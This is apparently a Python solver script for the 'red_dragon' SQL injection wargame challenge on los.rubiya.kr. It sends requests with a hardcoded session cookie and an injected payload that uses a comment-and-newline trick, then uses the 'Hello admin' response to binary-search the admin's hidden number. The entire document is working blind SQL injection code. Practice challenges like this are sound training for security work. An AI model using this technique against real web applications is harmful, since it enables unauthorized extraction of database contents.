import requests

cookie = {'PHPSESSID' : 'k1v4kvght7rno677jlk709rl1r'}

def dist_tf(num):
    url = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php?id='||no<%%23&no=%%0a%d" % (num)
    res = requests.get(url, cookies=cookie)
    
    if "Hello admin" in res.text:
        return True;
    else:
        return False;
    
for i in range(1,100):
    print("%d ... " % (10**(i-1)), end="")
    if dist_tf(10**(i-1)):
        no_len = i - 1
        print("O\n")
        print("=======================")
        print("admin no length  |  %d" % (i-1))
        print("=======================\n")
        break
    
    else:
        print("X")
        
max = int('9'*no_len)
min = 10**(no_len-1)

for i in range(1,10000):
    if dist_tf(int((min+max)/2)):
        max = int((min+max)/2)
    else:
        min = int((min+max)/2)
    
    print("[%d] %d ~ %d" % (i, min, max))
    
    if ((max - min) <= 1):
        print("\n==============================")
        print("admin no  |  %d" % (min))
        print("==============================\n")
        break